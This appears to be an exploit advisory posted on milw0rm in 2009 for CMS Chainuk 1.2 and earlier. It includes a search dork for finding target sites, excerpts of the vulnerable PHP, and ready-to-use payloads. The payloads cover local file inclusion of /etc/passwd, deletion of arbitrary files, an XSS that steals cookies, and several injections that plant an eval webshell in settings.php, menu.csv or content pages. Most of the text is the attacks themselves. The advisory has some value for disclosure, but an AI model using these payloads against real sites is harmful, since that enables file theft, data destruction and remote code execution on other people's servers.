@@ -1,0 +1,138 @@
+CMS Chainuk <= v.1.2 Vulns
+Home: Cms.tut.su
+Dork: "Cms.tut.su, 2009 g."
+
+eLwaux(c) 14.06.2
+
+
+## ## ## ## ## ##
+
+LFI
+/index.php
+---------------------------------------------------------------------------
+6:   if (isset($_GET ['id']))
+7:   {
+8:   [color=white]$id = $_GET ['id'];[/color]
+9:   }
+10:  else
+11:  {
+12:   $id = $index;
+13:  }
+14:  if (file_exists ("content/" . $id . ".php"))
+15:  {
+16:   [color=white]include ("content/" . $id . ".php");[/color]
+17:  }
+18:  else
+19:  {
+20:   include ('404.html'); exit;
+21:  }
+--------------------------------------------------------------------------
+
+exploit:
+     index.php?id=../../../../etc/passwd%00
+
+
+## ## ## ## ## ##
+
+LFI
+/admin/admin_edit.php
+---------------------------------------------------------------------------
+2:   if (isset($_GET['id']))
+3:   {
+4:   [color=white]$id = $_GET['id'];[/color]
+5:   if (!file_exists("../content/" . $id . ".php")) die ("..");
+6:   [color=white]include("../content/" . $id . ".php");[/color]
+23:  }
+-----------------------------------------------------------------------------
+
+exploit:
+    index.php?id=../../../../etc/passwd%00
+
+
+## ## ## ## ## ##
+
+delete any files ()
+/admin/admin_delete.php[
+---------------------------------------------------------------------------
+3:  if([color=white]unlink('../content/'.$_GET['id'].'.php')[/color])
+4:  {
+5:  echo 'Page '.$_GET['id'].' deleted';[/code]
+-----------------------------------------------------------------------------
+
+exploit:
+   /admin/admin_delete.php?id=../FILE.PHP%00
+
+
+## ## ## ## ## ##
+
+LFI / XSS / Shell
+/admin/admin_menu.php
+-----------------------------------------------------------------------------
+37:  $menu = explode (',', $_POST['menu']);
+38:  $csvcont ='';
+39:  foreach ($menu as $a)
+40:  {
+41:   if (!preg_match("/[0-9]/", $a)) die ("error");
+42:   if (!file_exists("../content/" . $a . ".php")) die ("error");
+43:   [color=white]include ("../content/" . $a . ".php");[/color]
+44:   $csvcont = $csvcont . $a . ";" . $page_4menu . "\n";
+45:  }
+65:  if (!file_put_contents("../menu.csv", $csvcont)) ..
+-----------------------------------------------------------------------------
+
+exploits:
+    LFI POST: menu=../1/../FILE.PHP%00,1,2,3,4,5,6,7
+    XSS POST: menu=../1../onmousemove="javascript:alert(document.cookies)">>/../index;,1,2,3,4,5,6,7
+    Shell: if <asp_tags: On> POST: menu=../1
+<asp=@eval(\$_GET[a]);asp>/../admin/passw,1,2,3,4,5,6,7
+                                 /?id=../menu.csv%00&a=phpinfo();[/CoDE]
+
+
+## ## ## ## ## ##
+
+Shell
+/admin_settings.php
+-----------------------------------------------------------------------------
+39:  if (!isset($_POST['tmpl']) || !isset($_POST['id']) ||
+!isset($_POST['menu']))
+40:  {
+41:   die ("...");
+42:  }
+43:  if (!file_exists("../templates/" . $_POST['tmpl'] .
+"/index.php")) die ("...");
+44:  if (!file_exists("../content/" . $_POST['id'] . ".php")) die ("...");
+45:  $mtpl = $_POST['menu'];
+46:  $set = "<? \$curr_tmpl='" . $_POST['tmpl'] . "'; \$index="=
+$_POST['id'] . "; \$menu_tmpl = \"" . $mtpl . "\"; ?>";
+63:  if (!file_put_contents("../settings.php", $set)
+-----------------------------------------------------------------------------
+
+exploit:
+   POST: action=abc
+                tmpl=default
+                id=1
+                menu=%TITLE%"; @eval($_GET["a"]); ?> //[/code]
+Shell: /settings.php?a=phpinfo();
+
+
+## ## ## ## ## ##
+
+Shell
+/admin_new.php
+-----------------------------------------------------------------------------
+POST: action=abc
+            text=abc
+            title='; @eval($_GET[a]); //
+            descr=abc
+            keys=abc
+            link=abc[/code]
+/content/=NUMBER.php?a=phpinfo();
+
+
+## ## ## ## ## ##
+
+Path Disclosure
+       /index.php?id=../admin/passw
+       /admin/admin_delete.php?id=thisf0ld3risn0texi5s5
+
+# milw0rm.com [2009-07-01]
